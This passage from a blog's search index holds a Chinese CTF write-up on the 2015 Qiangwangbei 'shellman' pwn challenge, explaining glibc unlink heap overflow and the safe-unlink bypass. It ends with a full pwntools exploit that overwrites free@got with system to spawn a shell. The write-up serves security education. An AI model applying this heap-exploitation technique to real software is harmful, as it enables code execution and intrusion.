fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cDovL3d3dy5rZXlzdG9uZS1lbmdpbmUub3JnL2tleXBhdGNoLw==">Keypatch<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cDovL2FuZ3IuaW8vaW5kZXguaHRtbF0=">angr<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cDovL2VyaWNwb255LmdpdGh1Yi5pby96M3B5LXR1dG9yaWFsL2d1aWRlLWV4YW1wbGVzLmh0bQ==">Z3 API in Python<i class="fa fa-external-link-alt"></i></span></li></ul><h3 id="附件下载"><a href="#附件下载" class="headerlink" title="附件下载"></a>附件下载</h3><p><a href="samples.zip">baby_mips</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
            <tag> angr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2015强网杯pwn之shellman</title>
      <link href="2016/04/27/2015%E5%BC%BA%E7%BD%91%E6%9D%AFpwn%E4%B9%8Bshellman/"/>
      <url>2016/04/27/2015%E5%BC%BA%E7%BD%91%E6%9D%AFpwn%E4%B9%8Bshellman/</url>
      
        <content type="html"><![CDATA[<h3 id="堆溢出原理"><a href="#堆溢出原理" class="headerlink" title="堆溢出原理"></a>堆溢出原理</h3><p>相比栈溢出而言，堆溢出的原理类似，但是堆溢出的利用则更复杂，因为<code>glibc</code>堆管理机制比较复杂。</p><p>堆溢出的利用主要围绕在<code>bin</code>中<code>free chunk</code>的合并过程，在两个<code>free chunk</code>的合并过程中，有两次改写地址的机会。例如，对于将要合并的<code>chunk P</code>，在合并发生时，<code>glibc</code>将<code>chunk P</code>从<code>binlist</code>中<code>unlink</code>掉，其中涉及到以下指针操作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FD = P -&gt; fd;  <span class="comment">// FD为相对于P下一个chunk的地址</span></span><br><span class="line">BK = P -&gt; bk;  <span class="comment">// BK为相对于P上一个chunk的地址</span></span><br><span class="line">FD -&gt; bk = BK;  <span class="comment">//用上一个chunk的地址去改写下一个chunk的前向指针bk,即改写FD+12(32 bits)或FD+24(64 bits)地址中的内容</span></span><br><span class="line">BK -&gt; fd = FD;  <span class="comment">//用下一个chunk的地址去改写上一个chunk的后向指针fd,即改写BK+8(32 bits)或BK+16(64 bits)地址中的内容</span></span><br></pre></td></tr></table></figure><a id="more"></a><p>注意上面的最后两行等号，实际是两次改写地址。如果<code>P</code>是攻击者精心伪造的<code>chunk</code>，那么在<code>unlink P</code>时，可改写<code>FD+12</code>或<code>BK+8</code>(32 bits)为攻击者指定的地址。例如，攻击者可以结合程序的具体情况，使<code>P</code>具备被<code>unlink</code>的条件(主要是设置<code>prev_size</code>和<code>size</code>)，并且有</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD = <span class="built_in">free</span>@got <span class="number">-12</span></span><br><span class="line">BK = shellcode地址</span><br></pre></td></tr></table></figure><p>这样在<code>unlink</code>发生时，<code>FD-&gt;bk = free@got-12+12 = free@got</code>，其内容将被<code>shellcode</code>地址改写。程序在下一次执行<code>free</code>时，实际将执行<code>shellcode</code>。这就是堆溢出的基本原理。</p><p>在新版本的<code>glibc</code>中，在<code>unlink p</code>时还增加了一些安全检查机制，如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                    </span><br><span class="line">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P);</span><br></pre></td></tr></table></figure><p>它会检查下一个<code>chunk</code>的<code>bk</code>和上一个<code>chunk</code>的<code>fd</code>是否均为<code>P</code>。因此上面的利用方法已经不可行了，因为<code>FD-&gt;bk</code>变成了<code>free@got</code>，而<code>BK-&gt;fd</code>变成了<code>shellcode的地址+8</code>。</p><p>为了绕过检查，需要找一个内存可控的已知地址<code>ptr</code>(设<code>*ptr = pControllable</code>，<code>pControllable</code>开始的内存可控)，以32位系统为例，伪造</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P-&gt;fd = ptr - <span class="number">12</span></span><br><span class="line">P-&gt;bk = ptr - <span class="number">8</span></span><br></pre></td></tr></table></figure><p>则有<code>FD-&gt;bk = BK-&gt;fd</code>。此时，当<code>unlink P</code>发生时，<code>ptr</code>这个地址中的值被改写了两次，第一次改写为<code>ptr-8</code>，第二次改写为<code>ptr-12</code>，最终改写为<code>ptr-12</code>。此时，有<code>pControllable=ptr-12</code>，故<code>ptr-12</code>开始的内存空间可控，如果在<code>ptr-12</code>开始的内存空间填入内容，就又可以改写<code>ptr</code>这个地址存储的内容<code>pControllable</code>。例如，可以改写<code>pControllable</code>为<code>GOT</code>表中的函数地址如<code>free@got</code>，把<code>free@got</code>这个地址的内容改写为<code>system@got</code>，那么在下次调用<code>free</code>时，就会调用<code>system</code>函数以实现代码执行。</p><h3 id="shellman分析"><a href="#shellman分析" class="headerlink" title="shellman分析"></a>shellman分析</h3><p>首先观察题目，shellman主要有以下几个功能：</p><ul><li>list shellcode：显示已建立的堆块(chunk)中存储的内容</li><li>new shellcode：建立一个新的堆块，大小和内容由用户决定</li><li>edit shellcode：对一个已经分配的堆块做编辑，在编辑时没有对大小进行限制，若太长可造成缓冲区溢出</li><li>delete shellcode：释放一个已经分配的堆块</li></ul><img data-src="images/shellman_function.png"><p>在建立一个新的堆块时，会用一个全局数组存储已分配堆块的地址、长度以及本堆块是否占用等信息。由于bss段的地址固定，这个全局数组的存在使得漏洞利用变得非常简单。</p><img data-src="images/shellman_save_info.png" style="zoom:90%"><img data-src="images/shellman_global_array.png" style="zoom:80%"><p>基于<code>unlink</code>操作进行漏洞利用的思路如下:</p><ul><li>分配两个长度合适的堆块，可以使用小于512字节的<code>small bin</code>(注意不要使用<code>fast bin</code>，因为其在释放时会保持<code>busy</code>状态，不会进行合并)。此时<code>chunk0</code>和<code>chunk1</code>被占用，没有<code>fd</code>和<code>bk</code>两个指针。<br>可以看到，先后分配了两个大小均为0xa0的<code>chunk</code>，其状态均为占用状态。说明：用户区的大小为0xa0，加上头部的0x10，<code>chunk</code>的总大小为0xb0。</li></ul><img data-src="images/shellman_gdb_debug_1.png" style="zoom:90%"><ul><li><p>对<code>chunk0</code>进行编辑，并溢出到<code>chunk1</code>。在<code>chunk</code> <code>malloc</code>返回地址开始的内存处伪造一个<code>chunk P</code>，设置相应的<code>prev_size、size</code>&amp;<code>flag</code>。同时设置<code>chunk1</code>的<code>prev_size</code>以及<code>size</code>&amp;<code>flag</code>(<code>prev_size</code>应为<code>P</code>的<code>size</code>，且<code>flag</code>的<code>p</code>位设置为0，使<code>glibc</code>认为前一个<code>chunk P</code>的状态是<code>free</code>状态)。</p><p>伪造<code>chunk P</code>时的<code>payload</code>如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">malloc_ptrs = <span class="number">0x6016d0</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0xa0</span> | <span class="number">1</span>) + p64(malloc_ptrs-<span class="number">0x18</span>) + p64(malloc_ptrs - <span class="number">0x10</span>) + <span class="string">&#x27;a&#x27;</span> * <span class="number">0x80</span> + p64(<span class="number">0xa0</span>) + p64(<span class="number">0xb0</span>)</span><br></pre></td></tr></table></figure><p>伪造后，chunk 0的内容如下。</p></li></ul><img data-src="images/shellman_gdb_debug_2.png" style="zoom:90%"><ul><li>删掉<code>chunk1</code>，触发<code>unlink(p)</code>，将<code>p</code>改写。在删除<code>chunk1</code>时，<code>glibc</code>会检查<code>size</code>部分的<code>prev_inuse</code>，发现前一个<code>chunk</code>是空闲的(实际是伪造的<code>chunk P</code>)，<code>glibc</code>希望将即将出现的空闲块合并。<code>glibc</code>会先将伪造的<code>chunk P</code>从它的<code>binlist</code>中解引用，所以触发<code>unlink P</code>。<br>这里寻找的内容可控的已知地址就是<code>bss</code>段存储已分配堆块地址的全局数组<code>ptr=0x6016d0</code>(根据程序逻辑，<code>*ptr=*0x6016d0=pControllable</code>，是已分配堆块，内容可编辑)。在<code>unlink P</code>触发之前，<code>0x6016b8</code>地址空间中的内容如下。</li></ul><img data-src="images/shellman_gdb_debug_3.png" style="zoom:90%"><p>​    <code>unlink P</code>触发后会执行以下操作，<code>0x6016b8</code>地址空间中的内容如下。</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">FD = p-&gt;fd  <span class="comment">// 即0x6016d0 - 0x18 (64位系统)</span></span><br><span class="line">BK = p-&gt;bk  <span class="comment">// 即0x6016d0 - 0x10</span></span><br><span class="line"><span class="comment">// 满足之前提到的限制，因为FD-&gt;bk 和BK-&gt;fd均为0x6016d0中保存的内容(即p)</span></span><br><span class="line">FD-&gt;bk = BK</span><br><span class="line">Bk-&gt;fd = FD  <span class="comment">// *ptr = 0x6016d0 - 0x18</span></span><br></pre></td></tr></table></figure><img data-src="images/shellman_gdb_debug_4.png" style="zoom:90%"><ul><li><p>对<code>chunk 0</code>进行编辑。由于已分配堆块地址保存在全局数组中，因此程序认为<code>*ptr = *(0x6016d0-0x18)</code>为已分配的第一个堆块。此时对<code>(0x6016d0-0x18)</code>开始的内存地址空间进行编辑，将<code>free@got</code>的地址写入<code>0x6016d0</code>，写入的时候注意不要破坏全局数组中堆块的长度及是否被占用等信息。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x1</span>) + p64(<span class="number">0xa0</span>) + p64(free_got) + p64(<span class="number">0x1</span>)</span><br></pre></td></tr></table></figure></li></ul><img data-src="images/shellman_gdb_debug_5.png" style="zoom:90%"><ul><li>由于<code>*ptr=free@got</code>了，只需要使用list功能便可以知道<code>free()</code>函数的真实地址，再根据对应libc中的偏移，算出<code>system()</code>函数的地址。同样，程序认为<code>*ptr</code>为已分配的第一个堆块，再次对<code>chunk 0</code>进行编辑，将<code>free@got</code>存储的内容改写为计算得到的<code>system()</code>函数的地址。由于已经将<code>free()</code>替换成<code>system()</code>函数了，只要再建立一个内容为<code>&quot;/bin/sh&quot;</code>的块，再将其释放，就可以得到<code>shell</code>了。</li></ul><blockquote><p>说明：在第一次对<code>chunk 0</code>进行编辑使其溢出时，需要在<code>chunk 0  malloc</code>的返回地址处伪造一个<code>chunk</code>，而不能直接利用原有<code>chunk 0</code>的结构进行伪造。如果利用原有的<code>chunk 0</code>结构进行伪造，伪造后<code>chunk 0</code>的内容如下。同样在<code>unlink P</code>时会进行对应的安全检查，此时<code>FD-&gt;bk</code>和<code>BK-&gt;fd</code>均为<code>0x6016d0</code>中保存的内容，即下图中<code>ptr&#39;</code>指针，而目前的<code>P</code>指针为<code>ptr</code>，由于两者不相等，无法通过安全检查。</p><img data-src="images/shellman_fake_chunk.png" style="zoom:90%"></blockquote><p>完整的漏洞利用代码如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list_shellcode</span>(<span class="params">target</span>):</span></span><br><span class="line">target.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">target.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_shellcode</span>(<span class="params">target, content</span>):</span></span><br><span class="line">target.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">target.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">target.recv()</span><br><span class="line">target.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">target.recv()</span><br><span class="line">target.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_shellcode</span>(<span class="params">target, num, content</span>):</span></span><br><span class="line">target.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">target.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">target.recv()</span><br><span class="line">target.sendline(<span class="built_in">str</span>(num))</span><br><span class="line">target.recv()</span><br><span class="line">target.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">target.recv()</span><br><span class="line">target.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_shellcode</span>(<span class="params">target, num</span>):</span></span><br><span class="line">target.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">target.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">target.recv()</span><br><span class="line">target.sendline(<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line">target = process(<span class="string">&#x27;./shellman&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./shellman&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bin_shell = <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">malloc_ptrs = <span class="number">0x6016d0</span></span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line">new_shellcode(target, <span class="string">&#x27;a&#x27;</span>*<span class="number">0xa0</span>)<span class="comment"># chunk0</span></span><br><span class="line">new_shellcode(target, <span class="string">&#x27;b&#x27;</span>*<span class="number">0xa0</span>)<span class="comment"># chunk1</span></span><br><span class="line">new_shellcode(target, bin_shell+<span class="string">&#x27;c&#x27;</span>*(<span class="number">0xa0</span>-<span class="built_in">len</span>(bin_shell)))<span class="comment"># &#x27;\x00&#x27; don&#x27;t cut the content</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># fake a chunk, start from the data position of chunk0 </span></span><br><span class="line"><span class="comment"># Note: 1) the size of original chunk1 is 0xa0 + 0x8*2 = 0xb0, we just change the prev_inuse bit</span></span><br><span class="line"><span class="comment"># 2 ) we have to fake a chunk. If we just use the chunk0 , it will fail to pass the check.</span></span><br><span class="line"><span class="comment">#if payload = p64(malloc_ptrs-0x18) + p64(malloc_ptrs - 0x10) + &#x27;a&#x27; * 0x90 + p64(0xb0) + p64(0xb0)</span></span><br><span class="line"><span class="comment">#when unlink chunk0, we have FD = p-&gt;fd = malloc_ptrs-0x18, BK=p-&gt;bk=malloc_ptrs-0x10</span></span><br><span class="line"><span class="comment">#then, FD-&gt;bk=*(malloc_ptrs-0x18+0x18)=*malloc_ptrs=p+0x10</span></span><br><span class="line"><span class="comment">#for FD-bk != p, also BK-&gt;fd != p, so it will failed.</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0xa0</span> | <span class="number">1</span>) + p64(malloc_ptrs-<span class="number">0x18</span>) + p64(malloc_ptrs - <span class="number">0x10</span>) + <span class="string">&#x27;a&#x27;</span> * <span class="number">0x80</span> + p64(<span class="number">0xa0</span>) + p64(<span class="number">0xb0</span>)</span><br><span class="line">edit_shellcode(target, <span class="number">0</span>, payload)</span><br><span class="line">delete_shellcode(target,<span class="number">1</span>)<span class="comment"># triger unlink chunk0</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x1</span>) + p64(<span class="number">0xa0</span>) + p64(free_got) + p64(<span class="number">0x1</span>)</span><br><span class="line">edit_shellcode(target, <span class="number">0</span>, payload)</span><br><span class="line">list_shellcode(target)</span><br><span class="line">target.recvuntil(<span class="string">&#x27;SHELLC0DE 0: &#x27;</span>)</span><br><span class="line">free_addr = u64(target.recv(<span class="number">16</span>).decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;%#x&quot;</span> % free_addr</span><br><span class="line"></span><br><span class="line"><span class="comment"># get through libc-database</span></span><br><span class="line">free_offset = <span class="number">0x844f0</span></span><br><span class="line">system_offset = <span class="number">0x45390</span></span><br><span class="line">system_addr = free_addr - free_offset + system_offset</span><br><span class="line">edit_shellcode(target, <span class="number">0</span>, p64(system_addr))</span><br><span class="line">delete_shellcode(target, <span class="number">2</span>)</span><br><span class="line">target.interactive()</span><br></pre></td></tr></table></figure><h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><ul><li><span class="exturl" data-url="aHR0cHM6Ly9zcGxvaXRmdW4ud29yZHByZXNzLmNvbS8yMDE1LzAyLzEwL3VuZGVyc3RhbmRpbmctZ2xpYmMtbWFsbG9jLw==">Understanding glibc malloc<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cDovL3d3dy5tczUwOS5jb20vMjAxNi8wMS8yMi9nbGliYy1oZWFwLWN0Zi13cml0ZXVwLw==">glibc堆溢出学习笔记（兼2015强网杯shellman writeup)<i class="fa fa-external-link-alt"></i></span></li></ul><h3 id="附件下载"><a href="#附件下载" class="headerlink" title="附件下载"></a>附件下载</h3><p><a href="samples.zip">shellman</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
